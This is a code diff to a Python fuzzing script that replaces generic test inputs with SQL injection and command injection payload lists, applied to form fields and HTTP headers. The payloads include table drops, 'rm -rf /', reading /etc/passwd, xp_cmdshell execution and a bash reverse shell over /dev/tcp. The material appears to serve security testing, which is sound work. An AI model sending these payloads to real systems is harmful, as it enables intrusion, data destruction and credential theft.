@@ -35,29 +35,35 @@ c_main = db_connection.cursor()
 driver_path = os.getenv('CHROMEDRIVER_PATH')
 
 def fuzz_parameters():
-    """Generate random fuzzing parameters for input fields."""
+    """Generate unique SQL and command injection payloads."""
     fuzz_inputs = [
-        "", "<script>alert(1)</script>", "../../etc/passwd", "A" * 1000, 
-        "admin'--", "%00", "!@#$%^&*()", "normalInput", "1234567890",
-        "'; DROP TABLE users; --", "`; exec xp_cmdshell('dir'); --"
+        "admin'--",  # SQL injection
+        "'; DROP TABLE users; --",  # SQL injection
+        "`; exec xp_cmdshell('dir'); --",  # Command injection
+        "`; ls -la; --",  # Command injection
+        "' OR '1'='1' --",  # SQL injection
+        "1; SELECT version(); --",  # SQL injection
+        "`; whoami; --",  # Command injection
+        "`; rm -rf /; --",  # Command injection
+        "'; exec master..xp_cmdshell('ping 127.0.0.1'); --",  # Command injection
+        "' UNION SELECT NULL, NULL; --"  # SQL injection (union-based)
     ]
     return random.choice(fuzz_inputs)
 
 def fuzz_headers():
-    """Generate random fuzzing headers."""
+    """Generate unique SQL and command injection payloads for headers."""
     fuzz_headers_list = [
-        {"X-Injected-Header": "' OR '1'='1"},
-        {"X-Exploit-Header": "<script>alert(1)</script>"},
-        {"X-Path-Traversal": "../../etc/passwd"},
-        {"X-Bad-Header": "A" * 1000},
-        {"X-SQL-Comment": "admin'--"},
-        {"X-Null-Byte": "%00"},
-        {"X-Special-Char": "!@#$%^&*()"},
-        {"X-Numeric": "1234567890"},
-        {"X-Normal-Header": "normalInput"},
-        {"X-Empty-Header": ""}
+        {"X-SQL-Inject": "' OR '1'='1"},  # SQL injection
+        {"X-Command-Inject": "`; uname -a; --"},  # Command injection
+        {"X-SQL-Comment": "admin'--"},  # SQL injection
+        {"X-Command-Exec": "`; cat /etc/passwd; --"},  # Command injection
+        {"X-SQL-Blind": "' AND SLEEP(5); --"},  # SQL injection (time-based blind)
+        {"X-Command-Inject-Bash": "`; bash -i >& /dev/tcp/127.0.0.1/8080 0>&1; --"},  # Command injection (reverse shell)
+        {"X-SQL-Union": "' UNION SELECT NULL, version(); --"},  # SQL injection (union-based)
+        {"X-Command-Inject-Python": "`; python -c 'import os; os.system(\"id\")'; --"},  # Command injection (Python)
     ]
     return random.choice(fuzz_headers_list)
+
 
 def apply_fuzzing_headers(driver):
     """Apply fuzzing headers using JavaScript."""
